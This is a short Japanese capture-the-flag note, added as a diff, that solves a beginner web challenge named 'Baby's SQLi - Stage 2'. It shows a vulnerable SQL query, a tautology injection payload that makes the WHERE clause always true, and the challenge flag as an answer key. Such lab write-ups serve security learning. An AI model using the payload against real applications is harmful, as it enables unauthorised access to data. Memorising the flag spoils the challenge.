@@ -1,0 +1,10 @@
+Q24.[Web]Baby's SQLi - Stage 2-
+
+SQLインジェクションを仕掛ける
+
+SELECT * FROM users WHERE name = '（入力値）';
+入力に
+t' OR 't' = 't
+を入れて常に真にできる
+
+cpaw{p@ll0c_1n_j@1l3:)}
